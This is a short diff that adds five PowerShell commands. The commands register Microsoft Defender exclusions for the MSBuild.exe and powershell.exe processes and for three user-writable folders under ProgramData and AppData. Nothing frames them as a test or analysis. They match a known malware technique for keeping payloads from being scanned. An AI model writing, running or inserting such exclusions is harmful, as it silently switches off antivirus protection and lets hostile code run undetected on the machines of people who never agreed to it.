@@ -1,0 +1,5 @@
+Add-MpPreference -ExclusionProcess MSBuild.exe
+Add-MpPreference -ExclusionProcess powershell.exe
+Add-MpPreference -ExclusionPath  C:\ProgramData\Google\
+Add-MpPreference -ExclusionPath  "%LocalAppData%\Microsoft\Windows\"
+Add-MpPreference -ExclusionPath  "%AppData%\Microsoft\Network\Connections\Pbk\"
